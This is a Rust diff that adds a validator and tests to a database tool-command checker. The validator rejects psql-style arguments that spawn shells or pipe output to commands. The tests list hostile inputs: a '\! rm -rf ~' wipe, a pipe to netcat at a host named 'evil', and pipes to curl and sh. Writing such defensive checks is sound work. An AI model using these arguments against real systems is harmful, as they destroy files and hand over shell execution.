@@ -433,6 +433,11 @@ impl ToolCommand {
         {
             return Err(invalid("the command's arguments are unusable".into()));
         }
+        if let Some(arg) = self.args.iter().find(|arg| runs_commands(arg)) {
+            return Err(invalid(format!(
+                "the argument {arg:?} could make the program run other commands"
+            )));
+        }
         if self.env.len() > MAX_ENV {
             return Err(invalid("the command sets too many variables".into()));
         }
@@ -458,6 +463,35 @@ impl ToolCommand {
         }
         Ok(())
     }
+}
+
+/// Arguments that make database consoles run shell commands or write
+/// through pipes: `psql`'s `\!`, `\o |cmd`, `\copy ... program`,
+/// `--output=|cmd`, and the like in other clients.
+fn runs_commands(arg: &str) -> bool {
+    const META: &[&str] = &["o", "g", "w", "i", "ir", "copy", "setenv", "gexec", "out"];
+    let lower = arg.to_ascii_lowercase();
+    let value = lower.split_once('=').map_or(lower.as_str(), |(_, v)| v);
+    if lower.starts_with('|') || value.trim_start().starts_with('|') || lower.contains("\\!") {
+        return true;
+    }
+    if lower.contains("program '") || value.trim_start().starts_with("system ") {
+        return true;
+    }
+    // A meta-command is a backslash word at the start or after a space or
+    // `=`, then a space or the end: `\o |sh`, `\copy t to ...`. Windows
+    // paths (`C:\Users\insert.sql`) have letters after the word.
+    lower.match_indices('\\').any(|(at, _)| {
+        let before = lower[..at].chars().next_back();
+        let word: String = lower[at + 1..]
+            .chars()
+            .take_while(char::is_ascii_alphabetic)
+            .collect();
+        let after = lower[at + 1 + word.len()..].chars().next();
+        before.is_none_or(|c| c.is_whitespace() || c == '=')
+            && META.contains(&word.as_str())
+            && after.is_none_or(|c| c.is_whitespace() || c == '|')
+    })
 }
 
 fn invalid(message: String) -> DbError {
@@ -697,6 +731,23 @@ mod tests {
             assert!(command.check(&task).is_err(), "{name}");
         }
         command.env.clear();
+        for arg in [
+            "--command=\\! rm -rf ~",
+            "--output=|nc evil 1",
+            "|curl x",
+            "-c \\copy t to program 'sh'",
+            "--command=\\o |sh",
+        ] {
+            command.args = vec![arg.into()];
+            assert!(command.check(&task).is_err(), "{arg}");
+        }
+        command.args = vec![
+            "--file=/b/x.sql".into(),
+            "--set=ON_ERROR_STOP=1".into(),
+            r"--file=C:\Users\ian\insert.sql".into(),
+            r"--exclude-table=system_logs".into(),
+        ];
+        assert!(command.check(&task).is_ok());
         command.password_env = Some("LD_PRELOAD".into());
         assert!(command.check(&task).is_err());
     }
